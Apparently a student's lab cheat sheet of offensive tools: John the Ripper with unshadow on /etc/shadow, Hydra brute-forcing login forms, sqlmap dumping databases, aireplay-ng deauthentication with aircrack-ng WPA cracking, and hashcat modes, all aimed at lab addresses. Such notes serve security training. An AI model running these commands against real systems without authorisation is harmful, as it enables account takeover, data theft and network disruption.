JOHN

	hash cracker
	https://github.com/openwall/john/blob/bleeding-jumbo/doc
	
	example: 
	
			john filename.hash --wordlist=/usr/share/wordlists/1k.txt
			
			
		cat /usr/share/doc/john/OPTIONS   - these files are .gz so gunzip em first

	John can be very particular about the formats it needs data in to be able to work with it; for this reason,
	to crack /etc/shadow passwords, you must combine it with the /etc/passwd file for John to understand the data it’s being given.
	To do this, we use a tool built into the John suite of tools called unshadow. The basic syntax of unshadow is as follows:

	unshadow [path to passwd] [path to shadow]

	unshadow: Invokes the unshadow tool
	[path to passwd]: The file that contains the copy of the /etc/passwd file you’ve taken from the target machine


	john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt

	john --list=formats | grep -iF "md5".
	
	john -i mypasswd.txt    			- incremental mode
	
	MASKING: specify characters to be used as password tries (instead of simple incremental)
				
	
								Mask									hybrid				output			candidates
					     --mask='pass'	 								pass								1
								pw?d	 								pw3									10
								?w?d?d?d								password			password123		1000x
								?w?s?w									Bozo				Bozo#Bozo		33x
								?w?s?W									Bozo				Bozo#bOZO		33x
								0x?1?1:?1?1:?1?1						-1=[0-9a-f]			0xde:ad:ca		16777216
								?3?l?l?l								-3=?l?u				Bozo, hobo		913952
								[Pp][Aa@][Ss5][Ss5][Ww][Oo0][Rr][Dd]						P@55w0rD		1296
								
				Basic Characters:	
									?a: Any ascii character
									?l: Lowercase letters (a-z)
									?u: Uppercase letters (A-Z)
									?d: Digits (0-9)
									?s: Special characters (!@#...)
									?h: Hexadecimal digits (0-9, a-f)
						example:
									john --incremental --mask='?l?l?l?l?l?l?l?l' hashfile.txt   - 8 any lowercase ascii to combine vs the hash
									
									
									
					once hash is cracked: <BOOM>
					 john --show <filename>
					 cracked val can also be seen 3rd line beginning from bottom once finished
									

									
																	
				hex encoding:
					\xHH for specifying any character code. For example, \x41 is “A” and \x09 is the code for TAB.
					
			
			
			
			examples:
						--mask='?a' --min-length=7 --max-length=7		
								
								
						
						
	
	
	the following script searches for the echoed string inside the specified file in parallel in 100mb blocks and writes to results.txt
	
	parallel --block 100M --pipe-part -a rockyou2021.txt -k --compress "grep -a -F -x 'search_string' {}" >> results.txt
	
	with progress bar:
	
	cat 2021.txt | pv | parallel --pipe --block 10M grep -n 'searchstring'
	
	
	
	line sum calc:
	parallel --pipe wc -l < wordlist.txt | awk '{sum+=$1} END {print sum}'
	
	

HYDRA

	brute force online services

	example:
	hydra -l <username> -P <password_list.txt> pop3://10.10.10.10:55007/<login_page>
	hydra -l <username> -P <wordlist> 10.10.10.10 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
																				dont replace USER and PASS


	!!! never forget -v or -vV for verbosity !!!
	
	-l: username
	-L: specify txt file for list of usernames
	-P: specify txt file for list of passes
	-x: min:max:charset   password generate min:max numeric value
	-y: disable symbols in generated passes with -x
	-f: exit after first found log/pass match
	-w: specify wait time (connection timeout) to reduce or increase default (esp if srvr drops connect for longer wait times, default 32)
	-t: specify number of parallel tasks (connection may drop if too high, try 8 or 4 or 2, default is 16)
	-I: skip wait time (good if running new tries, default 10 sec wait for resuming old one)
	-R: resume old instance (no other flags required)
	-s <portnumber>: specify port if not protocol default is set on target
	-d: debugging
	

SQLMAP
	
	-u: specify url
	--dbs: extract all databases
	--tables: extract tables
	-D: specify database to use
	-T: specify table from specified database
	--dump: self explanatory
	
	sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D users --tables
	sqlmap -u http://sqlmaptesting.thmsearch/cat=1 -D users -T thomas --dump
	
	

WIFI DEAUTH AND CRACKING HANDSHAKE



	if not in monitor mode  - sudo ip link set dev ---wlanid--- down
							- sudo iw dev ---wlanid --- set type monitor
							- sudo ip link set dev ---wlanid--- up
							
							
			iw dev ---wlanid--- scan
			look for RSN part - group cipher CCMP - cipher block chaining message auth code proto
			auth suites should be PSK - WPA/2 password based auth


			sudo airodump-ng wlp3s0
	
				--- get bssid of target 
										
									
													
								
										
	after we get bssid run airodump to capture handshakes before running aireplay to deauth

		sudo airodump-ng -c 6 --bssid xx:xx:xx:xx:xx:xx -w output-file wlanx
					 the -c specifies the channel - if not set, airodump will scan/capture all channels - to change channel:
						  sudo iw dev wlp3s0 set channel 1
						  
		sudo aireplay-ng -0 1 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlp3s0
		
		The -0 flag indicates the deauthentication attack, 
		The 1 value is the number of deauths to send. 
		The -a indicates the BSSID of the access point.
		and -c indicates the BSSID of the client to deauthenticate.					
			



		once we got the wpa handshake we can start to try and crack the code
		
		sudo aircrack-ng -a 2 -b xx:xx:xx:xx:xx:xx -w rockyou.txt output*cap
					 the -a specifies the wpa/wpa2 attack mode	
								
		 If you get Packets contained no EAPOL data; unable to process this AP error,
		 this means that you ran aircrack-ng prior to the handshake being captured,
		 or that the handshake was not captured at all. 



HASHCAT

		hash cracker, using gpu for faster operations than john
		can take files as wordlists or generate passwords or combine both
		can add or modify characters of provided wordlists
		
		man hashcat
		
		
		-m <number>:	- specify mode (based on hash type)
		-a <number>:	- specify attack mode
									   0 = Straight
									   1 = Combination
									   3 = Brute-force
									   6 = Hybrid Wordlist + Mask
									   7 = Hybrid Mask + Wordlist

						
		-o:				- define output file
		--show: 		- show cracked passwords
		
		example:
		hashcat -a 3 -m 17200 /sg/hashedfile.txt
		hashcat -a 1 -m 200 /sg/hashedfile.txt /usr/share/wordlists/rockyout.txt
		
		Passwords consist of six characters and begin with “Pa”, the rest of the characters are numbers:
		hashcat -m 17200 -a 3 hashedfile.txt 'Pa?d?d?d?d'
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		


